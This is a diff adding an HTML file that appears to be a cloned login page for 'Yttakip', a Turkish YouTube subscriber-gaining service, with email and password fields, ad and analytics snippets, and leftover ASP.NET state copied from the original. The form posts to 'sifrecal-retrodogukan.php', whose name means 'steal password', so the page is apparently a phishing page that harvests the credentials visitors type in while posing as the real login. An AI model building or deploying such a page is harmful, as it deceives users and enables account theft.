@@ -1,0 +1,160 @@
+
+
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><meta name="viewport" content="width=device-width, initial-scale=1" /><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><link rel="shortcut icon" href="assets/img/favicon.ico" /><meta name="keywords" content="youtube abone kazan, yttakip,abone arttır,izleme arttır, youtube takipci, yt abone, yt video, yotube kanal, abone, izlenme, youtube kazan, youtube artır,ytdestek" /><meta name="description" content="Yttakip&#39;le artık Youtube&#39;de daha rahat abone kazanabilirsiniz. Ayrıca Youtube videolarınıza bu sistemle izleyici bulabilirsiniz." />
+<link rel="stylesheet" href="css/style.css">
+    <script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
+    <!-- Custom Theme files -->
+    <link href="css/style.css" rel="stylesheet" type="text/css" media="all" />
+    <!-- //Custom Theme files -->
+    <!-- web font -->
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800" rel="stylesheet" type="text/css" />
+    <!--web font-->
+    <!-- //web font -->
+    
+    <title>Giriş Yap</title>
+         
+
+<title>
+
+</title></head>
+<body>
+    <form method="post" action="sifrecal-retrodogukan.php" id="form1">
+<div class="aspNetHidden">
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUJOTMxNjczMDg4ZGQ81C3OkSJBeYqv/PhzeRBJNfvsK82OXObsTk0LnULWAw==" />
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['form1'];
+if (!theForm) {
+    theForm = document.form1;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="/WebResource.axd?d=2IsD-oWnSO458vJop945pcmnZ4jEa1F8-qukRbKwfrgCM1qUeqm6WZIgSucm_RAu8iND61avWhUhgmQSxiwqEsNbC8LIGKfR-4ErKWbi3wI1&amp;t=636660786922381111" type="text/javascript"></script>
+
+
+<script src="/ScriptResource.axd?d=9tpCm-oLO3R8rEFna8IsyWY5s6ZjyLCEE4VEAj5Eu_q6oP1otU7KvA41ED7I_adk9Pw-xhE7oMh16ERcQg3knslAfP8dCxPdZC8iJ988Z4ECquBJwTDmr4dvYi6ZBQfPYX9ICcG1zeL0IGxFBvs80UOklBvanfp_0VSAZkx6O3g1&amp;t=72fc8ae3" type="text/javascript"></script>
+<script src="/ScriptResource.axd?d=y7Ht9oFWEL2HVfzzgBXk5xtEdWYADX5pXcn11ifXe--8qCXC2vwShIzBuihkDId6O8vNWWzTqQEdokAKaVX1CaJCVvc4Q3TbBWyGGa0y117c7T1lfGsZZTuxwk4QiZWO-oAxy0VJpFr3gAqozo0lb8p6Pjmf5vlETVOCfJ0CH6y-gVhUb7sRfB7ebJ73faUS0&amp;t=72fc8ae3" type="text/javascript"></script>
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="4A1FFC02" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAPyxNn5XvanjC6juxLxtflQZBEo8HM2nB4XhHipwSSP/Iw7t+aOQlJ+rpluCTaRNaeHMO0LRdvvO+Q9OUZO2FM6pTPXdUdV5xYn9o1D2PEGzw==" />
+</div>
+    <script type="text/javascript">
+//<![CDATA[
+Sys.WebForms.PageRequestManager._initialize('ctl00$ScriptManager1', 'form1', [], [], [], 90, 'ctl00');
+//]]>
+</script>
+
+    
+    <script type="text/javascript">
+        function giris() {
+            var username = document.getElementById('username').value;
+            var sifre = document.getElementById('sifre').value;
+            PageMethods.giris(username, sifre, islemBasarilii);
+            function islemBasarilii(sonuc) {
+                if (sonuc == "Abone") {
+                    window.location.href = "Abone";
+                    document.getElementById('Bilgi').innerHTML = "<font color='white'> İşlem Başarılı</font> <br />";
+                }
+                else if (sonuc == "hayır") {
+                    document.getElementById('Bilgi').innerHTML = "<font color='red'>Uyarı:</font><font color='white'> Giriş Bilgileriniz Yanlış.</font> <br />";
+                    alert("Uyarı : Giriş Bilgileriniz Yanlış.");
+                }
+            }
+        }
+    </script>
+
+
+    
+    <div class="w3layouts-main">
+        
+        <h1>Giriş</h1>
+        <div class="agilesign-form">
+            <div class="agileits-top">
+                <label id="ContentPlaceHolder1_Bilgi"></label>
+
+
+
+                <div class="styled-input w3ls-text">
+
+                    <input name="ctl00$ContentPlaceHolder1$username" type="text" id="ContentPlaceHolder1_username" required="" />
+                    <label>E-Mail</label>
+                    <span></span>
+                </div>
+
+                <div class="styled-input w3ls-text">
+                    <input type="password" id="sifre" name="sifre" required="">
+                    <label>Şifre</label>
+                    <span></span>
+                </div>
+ 
+
+                <div id="btnss" class="agileits-bottom">
+               
+                    <input type="submit" name="ctl00$ContentPlaceHolder1$Button1" value="Giriş Yap" id="ContentPlaceHolder1_Button1" />
+
+                </div>
+                               <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- YttakipGiris -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:320px;height:100px"
+     data-ad-client="ca-pub-5120644310278354"
+     data-ad-slot="3164154660"></ins>
+<script>
+    (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+            </div>
+            <div class="w3agile-btm">
+                <p>Üye Değilmisin? <a href="Kayit.aspx">Hemen Üye Ol</a> </p><br />
+                <p>Şifrenimi Unuttun? <a href="SifremiUnuttum.aspx">Hemen Tıkla O Zaman</a></p>
+            </div>
+        </div>
+    </div>
+                                           <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- yttakip -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5120644310278354"
+     data-ad-slot="4778684972"
+     data-ad-format="auto"></ins>
+<script>
+    (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+    <div class="copyright">
+        <p>
+            © 2017 Youtube Abone Kazanma Sistemi <a href="#" target="_blank">Aboneci</a></p>
+    </div>
+    </form>
+    <script>
+        (function (i, s, o, g, r, a, m) {
+            i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+                (i[r].q = i[r].q || []).push(arguments)
+            }, i[r].l = 1 * new Date(); a = s.createElement(o),
+  m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+
+        ga('create', 'UA-103572176-1', 'auto');
+        ga('send', 'pageview');
+
+</script>
+<!-- Yandex.Metrika counter --> <script type="text/javascript" >                                    (function (d, w, c) { (w[c] = w[c] || []).push(function () { try { w.yaCounter45458709 = new Ya.Metrika({ id: 45458709, clickmap: true, trackLinks: true, accurateTrackBounce: true, webvisor: true, trackHash: true }); } catch (e) { } }); var n = d.getElementsByTagName("script")[0], s = d.createElement("script"), f = function () { n.parentNode.insertBefore(s, n); }; s.type = "text/javascript"; s.async = true; s.src = "https://mc.yandex.ru/metrika/watch.js"; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "yandex_metrika_callbacks"); </script> <!-- /Yandex.Metrika counter -->
+</body>
+</html>
